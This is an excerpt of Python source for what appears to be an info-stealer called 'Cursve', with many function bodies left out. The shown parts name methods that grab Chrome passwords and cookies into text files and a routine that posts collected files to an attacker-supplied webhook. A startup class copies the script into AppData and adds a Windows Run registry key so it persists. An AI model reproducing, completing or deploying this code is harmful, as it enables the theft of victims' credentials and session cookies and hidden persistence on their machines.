...
def main(webhook: str) -> None: 
    ...
    embed.set_author(name="Cursve", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
    embed.set_footer(text="Cursve ❤ Made by https://github.com/terik1640")
    
    webhook.send(embed=embed, files=files if files != [] else None, username="Cursve", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
...
class google():
    ...
    def grabPassword(self):
        ...
        with open('.\\chrome-passwords.txt', 'w') as f:
            f.write('Cursve /// Google Chrome Passwords\n\n\n')
    ...
    def grabCookies(self):
        ...
        with open('.\\chrome-cookies.txt', 'w') as f:
            f.write('Cursve /// Google Chrome cookies\n\n\n')
...
class startup():
    def __init__(self):
        ...
        self.Cursve_dir = self.mk_appdata()
        self.mv_self()
        self.reg_add()
    ...
    def mk_appdata(self):
        ...
        shutil.rmtree(roaming + "\\" + "Cursve") if os.path.exists(roaming + "\\" + "Cursve") else None
        
        os.mkdir(roaming + "\\" + "Cursve")
        
        Cursve_dir = roaming + "\\" + "Cursve" if os.path.exists(roaming + "\\" + "Cursve") else None
            
        return Cursve_dir
    
    def mv_self(self):
        shutil.copy2(__file__, self.Cursve_dir + "\\" + os.path.basename(__file__))

    def reg_add(self):
        subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Cursve", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Cursve", "/t", "REG_SZ", "/d", self.Cursve_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
